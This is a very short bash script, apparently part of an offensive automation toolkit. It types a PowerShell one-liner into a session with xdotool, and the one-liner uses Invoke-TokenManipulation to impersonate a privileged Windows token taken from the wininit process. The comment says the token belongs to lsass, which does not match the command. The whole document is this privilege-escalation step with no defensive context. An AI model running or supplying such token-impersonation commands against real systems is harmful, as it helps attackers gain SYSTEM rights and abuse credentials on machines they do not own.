#!/bin/bash

: '
ps: Makes the current thread impersonate the lsass security token
'

paste_command "Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser"
xdotool key Return
